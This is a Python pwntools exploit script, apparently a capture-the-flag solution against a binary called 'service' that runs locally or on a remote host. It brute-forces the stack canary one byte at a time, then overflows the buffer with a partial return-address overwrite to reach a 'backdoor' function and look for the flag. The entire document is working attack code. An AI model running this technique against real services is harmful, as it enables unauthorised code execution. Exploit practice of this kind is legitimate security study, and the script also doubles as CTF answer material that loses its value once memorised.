from pwn import *
context(os="linux", arch="i386", kernel="amd64")

g_fname = './service'
elf = ELF(g_fname)
context.binary = elf

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    g_io = remote(host, int(port))
else:
    g_io = process(g_fname)

s,sl,sa,sla = g_io.send, g_io.sendline, g_io.sendafter, g_io.sendlineafter
r, ra, rl = g_io.recv, g_io.recvall, g_io.recvline

def pwn():
    # guess canary bruteforcely
    canary = b'\x00'
    padding = b'a'*0x68
    for _ in range(7):
        for i in range(256):
            tmp = canary + p8(i)
            sa(b'welcome\n', padding + tmp)
            data = rl()
            if b'have fun' in data:
                canary = tmp
                break
    log.success(f'canary: 0x{u64(canary):x}')

    backdoor_offset = 0x5231
    # overflow to partially write return address, make it return to backdoor
    for i in range(16):
        backdoor_offset = (i << 12) + 0x22e
        s(padding + canary + p64(0xbadcaffedeadbeef) + p16(backdoor_offset))
        data = rl()
        log.info(data)
        if b'{' in data:
            print(data)
            break

if __name__ == '__main__':
    pwn()
    g_io.interactive()